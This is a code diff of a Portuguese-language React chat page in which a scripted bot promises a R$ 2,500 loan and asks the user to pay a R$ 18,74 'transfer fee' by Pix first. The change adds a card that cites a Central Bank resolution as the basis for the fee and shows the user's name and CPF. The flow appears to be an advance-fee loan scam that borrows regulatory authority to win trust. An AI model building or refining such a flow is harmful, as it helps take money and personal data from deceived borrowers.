@@ -1735,26 +1735,53 @@ const Chat = () => {
                       setPaymentPhase("taxa");
                       setPixPaid(false);
                       setTimeout(() => {
-                        setMessages((prev) => [...prev, { id: Date.now(), text: "Prosseguir com a taxa de liberação!", fromUser: true, time: getNow(), read: true }]);
+                        setMessages((prev) => [...prev, { id: Date.now(), text: "Prosseguir com a taxa de transferência!", fromUser: true, time: getNow(), read: true }]);
                       }, 300);
                       setTimeout(() => {
                         addBotMessages(() => [{
                           id: Date.now() + 2,
-                          text: `Perfeito, ${firstName || "cliente"}! Para liberar o valor de ${formatCurrency(loanDetails?.valor || 2500)} na sua conta, realize o pagamento da taxa de liberação.\n\nApós a confirmação, o crédito será depositado em até 24 horas.`,
+                          text: `${firstName || "Cliente"}, conforme Resolução BCB nº 4.893/2021, segue abaixo o normativo regulatório referente à taxa de transferência interbancária:`,
                           fromUser: false, time: getNow(), read: true,
                         }]).then(() => {
-                          generatePixPayment();
+                          addBotMessages(() => [{
+                            id: Date.now() + 3,
+                            normativoCard: true,
+                            fromUser: false, time: getNow(), read: true,
+                          }]);
                         });
                       }, 500);
                     }}
                     className="btn-3d w-full !py-2.5 !rounded-xl !text-sm !px-4"
                   >
-                    Pagar taxa de liberação
+                    Pagar taxa de transferência
                   </button>
                 </div>
               )}
               {msg.taxaButton && taxaConfirmed && (
                 <div className="text-center text-xs text-green-600 font-semibold py-1">Prosseguindo...</div>
+              )}
+              {msg.normativoCard && (
+                <NormativoCard
+                  nome={nome}
+                  cpf={cpf}
+                  valor={loanDetails?.valor || 2500}
+                  onConfirm={() => {
+                    setNormativoConfirmed(true);
+                    setTimeout(() => {
+                      setMessages((prev) => [...prev, { id: Date.now(), text: "Li e estou ciente do normativo!", fromUser: true, time: getNow(), read: true }]);
+                    }, 300);
+                    setTimeout(() => {
+                      addBotMessages(() => [{
+                        id: Date.now() + 2,
+                        text: `Perfeito, ${firstName || "cliente"}! Para liberar o valor de ${formatCurrency(loanDetails?.valor || 2500)} na sua conta, realize o pagamento da taxa de transferência de R$ 18,74.\n\nApós a confirmação, o crédito será depositado em até 24 horas.`,
+                        fromUser: false, time: getNow(), read: true,
+                      }]).then(() => {
+                        generatePixPayment();
+                      });
+                    }, 500);
+                  }}
+                  confirmed={normativoConfirmed}
+                />
               )}
               <div className="flex items-center justify-end gap-1 mt-1">
                 <span className="text-[10px] text-muted-foreground">{msg.time}</span>
